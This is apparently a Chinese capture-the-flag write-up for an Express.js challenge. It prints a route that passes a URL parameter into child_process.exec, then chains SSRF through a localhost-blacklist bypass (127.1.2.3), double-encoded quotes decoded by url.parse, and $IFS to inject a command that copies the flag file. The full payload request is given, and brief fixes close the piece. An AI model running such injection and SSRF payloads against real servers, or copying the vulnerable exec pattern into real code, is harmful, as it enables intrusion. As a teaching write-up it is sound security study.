# Web题：web_babyjs

> 该题为js网站题目，使用js服务端express框架。

## 0x00. 漏洞成因

在路由文件`web_babyJS/routes/index.js`中，代码如下：

```javascript
var express = require('express');
var config = require('../config');
var url=require('url');
var child_process=require('child_process');
var fs=require('fs');
var request=require('request');
var router = express.Router();


var blacklist=['127.0.0.1.xip.io','::ffff:127.0.0.1','127.0.0.1','0','localhost','0.0.0.0','[::1]','::1'];

router.get('/', function(req, res, next) {
    res.json({});
});

router.get('/debug', function(req, res, next) {
    console.log(req.ip);
    if(blacklist.indexOf(req.ip)!=-1){
        console.log('res');
        var u=req.query.url.replace(/[\"\']/ig,'');
        console.log(url.parse(u).href);
        let log=`echo  '${url.parse(u).href}'>>/tmp/log`;
        console.log(log);
        child_process.exec(log);
        res.json({data:fs.readFileSync('/tmp/log').toString()});
    }else{
        res.json({});
    }
});


router.post('/debug', function(req, res, next) {
    console.log(req.body);
    if(req.body.url !== undefined) {
        var u = req.body.url;
        var urlObject=url.parse(u);
        if(blacklist.indexOf(urlObject.hostname) == -1){
            var dest=urlObject.href;
            request(dest,(err,result,body)=>{
                res.json(body);
            })
        }
        else{
            res.json([]);
        }
    }
});

module.exports = router;

```

根据代码可以看出如下信息：

1. `line22~24`执行系统命令，将参数url的值写入`/tmp/log`文件，但是命令用引号引起来了，并且在`line20`过滤了单引号和双引号。得想办法绕过过滤最中形成单或双引号。

2. GET请求/debug，要求客户IP在`blacklist`数组中，即要求客户来自于本地。显示`/tmp/log`文件内容，并执行第1点，也就是把url参数内容写入`/tmp/log`文件。

3. POST请求/debug，接受参数url，服务器会去访问url参数的值，但要求url的host不能出现在`blacklist`中，实际上`127.0.0.1~127.255.255.255`均是本地回环(Loopback, lo)。
4. 根据第3点得知的POST请求的功能，可知，使用POST请求/debug可让服务器产生对本地的GET请求。

构造如下请求即可绕过黑名单限制，成功执行echo命令写log：

![bypass_blacklist](bypass_blacklist.jpg)

下一步只需绕过单双引号的过滤。

在`line22`行调用的是`url.parse(u).href`，变量`u`是上一步过滤掉单双引号之后的网址。*记住，一个完整的网址形式是*：

> **scheme://username:password@host:port/path?getkey=getval&getkey2=getval2**

NodeJs的url库中，parse函数对`username`、`password` 进行了一次url解码。参见：

> [[node](https://github.com/nodejs/node)/[lib](https://github.com/nodejs/node/tree/master/lib)/[**url.js**](https://github.com/nodejs/node/blob/master/lib/url.js)

```javascript
343:    if (atSign !== -1) {
344:      this.auth = decodeURIComponent(rest.slice(0, atSign));
345:      start = atSign + 1;
346:    }
```

当有at符号(@)时，@前面的用户名密码会被decodeURIComponent解码。所以构造GET请求`http://127.1.2.3:8088/debug?url=http://%2527@cc;%23`会使`log`变量内容变为：

```bash
echo  'http://'@cc/;#'>>/tmp/log
```

因为GET请求会显示`/tmp/log`的内容，所以考虑把`/tmp/flag`拷贝到`/tmp/log`。

想要构造出：

```bash
echo  'http://'@cc/;cp /tmp/flag /tmp/log;#'>>/tmp/log
```

那么GET请求应该是：

`http://127.1.2.3:8088/debug?url=http://%2527@cc;cp /tmp/flag /tmp/log;%23`

但是发现空格就算使用%20或%2520等无论如何都无法出现。

> shell环境中$IFS为空格

更正GET请求：

`http://127.1.2.3:8088/debug?url=http://%2527@cc;cp$IFS/tmp/flag$IFS/tmp/log;%23`

将该请求装载到POST请求中：

```http
POST /debug
Host: babyjs.web:8088
Content-Type: application/x-www-form-urlencoded

url=http://127.1.2.3:8088/debug?url%3Dhttp://%252527@cc;cp$IFS/tmp/flag$IFS/tmp/log;%2523
```

> **❗注意** 经过第一层POST请求后参数会被解码一次，所以从GET请求再装载到POST请求，需要将%加一层转码成%25

如图：

![POST请求](post_request.jpg)

![nodejs控制台](node_console.jpg)

此时再通过POST提交任意GET请求，使程序显示`/tmp/log`，会发现、`/tmp/flag`已经被复制到了`/tmp/log`，并且被我们读到了。如图：

![读到flag](show_flag.jpg)

## 0x01. 漏洞修复

1. 将`url.parse(u).href`过滤掉引号再拼接给`log`字符串。
2. 也许有更优雅的命令执行方式。
3. 避免SSRF(Server Side Request Forgery)